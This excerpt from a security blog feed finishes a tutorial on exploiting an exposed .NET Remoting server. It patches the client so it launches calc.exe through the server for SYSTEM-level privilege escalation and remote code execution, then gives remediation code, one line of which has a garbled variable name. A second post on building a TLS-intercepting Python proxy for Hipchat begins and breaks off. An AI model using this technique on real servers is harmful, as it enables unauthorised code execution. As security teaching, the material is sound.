&lt;p&gt;There is another way to do this. Download &lt;a href=&#34;https://www.linqpad.net/Download.aspx&#34; target=&#34;_blank&#34;&gt;LINQPad 5.0&lt;/a&gt;. The standard version is free and is more than enough for our purpose. Copy paste all of the code in the client class into it. Now just like in Visual Studio we need to add references and import namespaces.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Change the &lt;code&gt;Language&lt;/code&gt; drop-down list to &lt;code&gt;C# Program&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Right click and select &lt;code&gt;References and Properties&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;In the &lt;code&gt;References&lt;/code&gt; tab click &lt;code&gt;Add&lt;/code&gt; and search for &lt;code&gt;System.Runtime.Remoting.dll&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Click &lt;code&gt;Browse&lt;/code&gt; and select &lt;code&gt;RemotingLibraryExpanded.dll&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Select the &lt;code&gt;Additional Namespace Imports&lt;/code&gt; tab.&lt;/li&gt;
&lt;li&gt;Click &lt;code&gt;Pick from assemblies&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Select &lt;code&gt;RemotingLibraryExpanded.dll&lt;/code&gt; and add its namespace.&lt;/li&gt;
&lt;li&gt;Select &lt;code&gt;System.Runtime.Remoting.dll&lt;/code&gt; and add &lt;code&gt;System.Runtime.Remoting.Channels&lt;/code&gt; and &lt;code&gt;System.Runtime.Remoting.Channels.Tcp&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/20.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/21.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Now all of the errors in LINQPad should be gone and we can modify the code. Modify the first &lt;code&gt;Console.WriteLine&lt;/code&gt; to &lt;code&gt;StartProcess(&amp;quot;c:\\windows\system32\calc.exe&amp;quot;)&lt;/code&gt; and press &lt;code&gt;Execute&lt;/code&gt;. The application may or may not execute properly. It will probably fail because we already have a TCP channel registered but we don&amp;rsquo;t care about that. Click on the &lt;code&gt;IL&lt;/code&gt; button at the bottom to see the generated IL code which is the same as what we wrote in dnSpy.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/22.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Now we can save the modified module (in this case a new version of the client executable) using dnSpy. Use &lt;code&gt;File (menu) &amp;gt; Save Module&lt;/code&gt; to save the new executable (let&amp;rsquo;s call it &lt;code&gt;Client1.exe&lt;/code&gt;). Run &lt;code&gt;Client1.exe&lt;/code&gt; and Pew.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/23.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;How can this be used in local privilege escalation?&lt;/em&gt;&lt;br /&gt;
In the original project, server was running as SYSTEM, which means any standard user could run any binary or command and effectively give themselves admin.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;How does this lead to Remote Code Execution (RCE)?&lt;/em&gt;&lt;br /&gt;
As we saw at the start of this post, server is listening on &lt;code&gt;0.0.0.0&lt;/code&gt; or all interfaces. This means any attacker can connect to the server and execute arbitrary commands. Windows Firewall will not help if you had added an exception for server when it was initially started.&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch7-a-7-remediation:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch7&#34;&gt;&lt;/a&gt; 7. Remediation&lt;/h3&gt;

&lt;p&gt;Remediation is an important part of my day job. I am not an &lt;code&gt;infosec thoughtleader&lt;/code&gt; but I think breaking is worth nothing if we don&amp;rsquo;t want to/cannot talk to and work with the developers to fix things. So I am going to add remediation sections to my posts where appropriate and do my small part in helping. As with any other part of these posts, if you think there is a better way of doing things please let me know.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/24.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;It should be noted that channel properties and registration could also be done in executables&amp;rsquo; config files. Please refer to &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms973907.aspx&#34; target=&#34;_blank&#34;&gt;Format for .NET Remoting Configuration Files&lt;/a&gt; for more information.&lt;/p&gt;

&lt;p&gt;I also have to reiterate that &lt;strong&gt;this is deprecated technology&lt;/strong&gt; and it should not be used for new applications. But if you are stuck with legacy code and want to fix it, please read on.&lt;/p&gt;

&lt;p&gt;Start here for MSDN articles on this topic: &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/9hwst9th%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;Security in Remoting&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;7-1-rce:a4cceda545ee0d0782d3d591639b4015&#34;&gt;7.1 RCE&lt;/h4&gt;

&lt;p&gt;In this scenario we should only be listening on &lt;code&gt;localhost&lt;/code&gt;. We have to modify the server. If we look at &lt;a href=&#34;https://msdn.microsoft.com/library/bb397830%28v=vs.100%29.aspx&#34; target=&#34;_blank&#34;&gt;TcpChannel properties&lt;/a&gt; we can see there is a &lt;code&gt;bindTo&lt;/code&gt; property. We can add it to a dictionary and use it in the constructor as follows:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Binding the server to localhost&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Collections;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;IDictionary&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Hashtable();&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;port&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8888&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;bindTo&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;remotingChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel(tcpChannelProperties,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// Or in the config file:&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;channels&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;channel&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;ref&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;tcp&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;port=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;8888&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;bindTo=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/channels&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;And now we can see the server listening only on localhost.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/25.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;We can also &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/bb187429%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;authenticate the client&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;7-2-channel-encryption-and-authentication:a4cceda545ee0d0782d3d591639b4015&#34;&gt;7.2 Channel Encryption and Authentication&lt;/h4&gt;

&lt;p&gt;We can also encrypt the channel. Channels have a &lt;code&gt;Secure&lt;/code&gt; property that will encrypt the channel if set to &lt;code&gt;true&lt;/code&gt;. However, &lt;strong&gt;both client and server channels should be set to secure&lt;/strong&gt;. We can simply add it to &lt;code&gt;tcpChannelProperties&lt;/code&gt; in both client and server and set it to &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Securing the server channel&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Collections;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;IDictionary&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Hashtable();&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;properttcpChannelPropertiesies[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;port&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8888&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;bindTo&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;secure&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;true&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;remotingChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel(tcpChannelProperties,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// Or in the config file:&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;channels&amp;gt;&lt;/span&gt;
	&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;channel&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;ref&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;tcp&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;port=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;8888&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;bindTo=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;secure=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/channels&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s only set the server channel to secure and see what happens:&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/26.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The client establishes the TCP connection and starts sending message in plaintext, but server never responds.&lt;/p&gt;

&lt;p&gt;If we modify the client code similar to the server:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Securing the client channel&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Collections;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;IDictionary&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Hashtable();&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tcpChannelProperties[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;secure&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// Or in the config file:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;channels&amp;gt;&lt;/span&gt;
	&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;channel&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;ref&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;tcp&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;secure=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/channels&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now the channel is encrypted.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/27.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/k62k71x0%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;Encryption and Message Integrity&lt;/a&gt; MSDN article talks about encryption. The &lt;code&gt;See Also&lt;/code&gt; links at the bottom of the page go to authentication articles. For example &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/59hafwyt%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;Authentication with the TCP Channel&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Hopefully this was useful. This will pave the way for another blog post where I talk about an older vulnerability that we will investigate using dnSpy and .NET Remoting. If you have any comments/feedback/corrections/complaints, please let me know; you know where to find me.&lt;/p&gt;

&lt;!-- links --&gt;
</description>
    </item>
    
    <item>
      <title>Proxying Hipchat Part 3: SSL Added and Removed Here :^)</title>
      <link>http://parsiya.net/blog/2015-10-19-proxying-hipchat-part-3-ssl-added-and-removed-here/</link>
      <pubDate>Mon, 19 Oct 2015 21:42:10 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2015-10-19-proxying-hipchat-part-3-ssl-added-and-removed-here/</guid>
      <description>

&lt;p&gt;Finally we are at part 3 of proxying Hipchat. This has been quite the adventure. In &lt;a href=&#34;http://parsiya.net/blog/2015-10-08-Proxying-Hipchat-Part-1-Where-did-the-Traffic-Go/&#34; title=&#34;Proxying Hipchat Part 1: Where did the Traffic Go?&#34; target=&#34;_blank&#34;&gt;&lt;strong&gt;part1&lt;/strong&gt;&lt;/a&gt; we identified the endpoints. In &lt;a href=&#34;http://parsiya.net/blog/2015-10-09-Proxying-Hipchat-Part-2-So-You-Think-You-Can-Use-Burp/&#34; title=&#34;Proxying Hipchat Part 2: So You Think You Can Use Burp?&#34; target=&#34;_blank&#34;&gt;&lt;strong&gt;part2&lt;/strong&gt;&lt;/a&gt; we answered the question “So you think you can use Burp” with yes and proxied some of Hipchat’s traffic with Burp.&lt;/p&gt;

&lt;p&gt;In this part we will talk about developing our own proxy in Python to view Hipchat’s traffic to/form &lt;code&gt;hipchatserver.com&lt;/code&gt; (which our example Hipchat server). First we are going to discuss how proxies work and we will get over Burp breaking our heart by creating our own proxy in Python to observe and dump the traffic in plaintext.&lt;/p&gt;

&lt;p&gt;Related (crappy) code is at: &lt;a href=&#34;https://bitbucket.org/parsiya/hipchat-proxy/src/&#34; target=&#34;_blank&#34;&gt;https://bitbucket.org/parsiya/hipchat-proxy/src/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For a similar effort (although with a much more complex proxy in &lt;code&gt;erlang&lt;/code&gt;) look at this post: &lt;a href=&#34;http://blog.silentsignal.eu/2015/10/02/proxying-nonstandard-https-traffic/&#34; target=&#34;_blank&#34;&gt;http://blog.silentsignal.eu/2015/10/02/proxying-nonstandard-https-traffic/&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;1-breaking-atlassian-s-eula:6f44788618f3174bd28bf25248bb8608&#34;&gt;-1 Breaking Atlassian’s EULA&lt;/h3&gt;

&lt;p&gt;Go to your Hipchat server&amp;rsquo;s web interface login page and view that page’s source. The same thing appears in &lt;a href=&#34;http://downloads.hipchat.com&#34; target=&#34;_blank&#34;&gt;http://downloads.hipchat.com&lt;/a&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/00-hipchatlogin-source-code.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Oops we just broke someone’s EULA. Note to people from the future: This is &lt;del&gt;a fresh&lt;/del&gt; an already stale Oracle meme (at the time of writing). For more information read an archived version of the article. &lt;a href=&#34;https://archive.is/xmtoW#selection-283.0-287.757&#34; target=&#34;_blank&#34;&gt;https://archive.is/xmtoW#selection-283.0-287.757&lt;/a&gt; (you can link selected text in archived web pages, what a time to be alive).&lt;/p&gt;

&lt;h3 id=&#34;0-ingredients:6f44788618f3174bd28bf25248bb8608&#34;&gt;0. Ingredients&lt;/h3&gt;

&lt;p&gt;I am going to continue where we left last time. I assume you have proxied Hipchat with Burp and have a general idea of what is happening here.
We will need Python. I am writing my code in 2.7.x because why not? But it should be easily portable to 3.x if not as it is. There are no dependencies as we will only use two standard libraries &lt;code&gt;socket&lt;/code&gt; and &lt;code&gt;ssl&lt;/code&gt;.
We will also need &lt;code&gt;OpenSSL&lt;/code&gt; or another way to create a Certificate Authority (CA) and a signed TLS certificate for &lt;code&gt;hipchatserver.com&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;1-hipchat-update:6f44788618f3174bd28bf25248bb8608&#34;&gt;1. Hipchat Update&lt;/h3&gt;

&lt;p&gt;Since last part, Hipchat has been update to version &lt;strong&gt;2.2.1395&lt;/strong&gt;. If we start Hipchat, we can see one extra request in Burp as follows:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;https://www.hipchat.com/release_notes/client_embed/qtwindows?version_num=1388
.
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;1388&lt;/code&gt; is our current version number before update. This request retrieves the patch notes for all released versions after &lt;code&gt;1388&lt;/code&gt; which is basically an HTML page (with some JavaScript in the header that will not be executed as we have seen before).&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/01-New-Request.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Let’s update and see what happens. The application sends a GET request to retrieve the new installer from &lt;code&gt;https://s3.amazonaws.com/downloads.hipchat.com/windows/HipChat-2.2.1395-win32.msi&lt;/code&gt;, and then executes it. After logging in we can see that the requests logged in Burp have not changed from last update.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/02-Patch-Notes.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;h3 id=&#34;2-how-does-a-proxy-work:6f44788618f3174bd28bf25248bb8608&#34;&gt;2. How does a Proxy Work?&lt;/h3&gt;

&lt;p&gt;In order to create our own proxy, we must know how proxies work. We have all used Burp before but we don’t really care what happens under the hood until something goes wrong.&lt;/p&gt;

&lt;p&gt;At first look Burp stands between our browser and the server, It receives requests from the browser, relays them to the server and vice versa. But it does a lot more than that. In order to exactly see what happens we need to look at network traffic or in other words &lt;code&gt;pcap or it did not happen&lt;/code&gt;. But capturing this traffic a bit tricky as Hipchat’s traffic to Burp is local so Wireshark/Netmon cannot record it. To demonstrate Burp in action I had three choices:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Use Microsoft Message Analyzer to capture both sides of traffic.

&lt;ul&gt;
&lt;li&gt;Good: Capture everything in one go.&lt;/li&gt;
&lt;li&gt;Evil: Proprietary format that cannot be opened by Wireshark. Readers have to install the tool (and let’s be honest no one looks at these files anyway :D).&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Capture browser’s traffic to Burp via RawCap and Burp’s traffic to the server with Wireshark.

&lt;ul&gt;
&lt;li&gt;Good: We have seen the request and can see them in Burp.&lt;/li&gt;
&lt;li&gt;Evil: Difficult to create. Have to use two applications.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Hook up a mobile device and set Burp as Proxy. The try to view something on the mobile device and capture the traffic on machine running Burp.

&lt;ul&gt;
&lt;li&gt;Good: Very easy to create.&lt;/li&gt;
&lt;li&gt;Evil: Readers cannot relate.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I went with the second option. There was however one problem, the timestamps on packets in Wireshark were exactly 4 hours ahead of RawCap (and we are -4 GMT so you can guess why). Usually this is not a problem in a capture because packet sequences are more important that the exact timestamp (I don&amp;rsquo;t do forensics). I used Wireshark’s timeshift to set them back and then merged both files.&lt;/p&gt;

&lt;p&gt;Now let’s see how Burp works. Let&amp;rsquo;s look at the capture file in Wireshark.&lt;/p&gt;

&lt;h4 id=&#34;2-1-get-http-downloads-hipchat-com-blog-info-html:6f44788618f3174bd28bf25248bb8608&#34;&gt;2.1 GET &lt;a href=&#34;http://downloads.hipchat.com/blog_info.html&#34; target=&#34;_blank&#34;&gt;http://downloads.hipchat.com/blog_info.html&lt;/a&gt;&lt;/h4&gt;

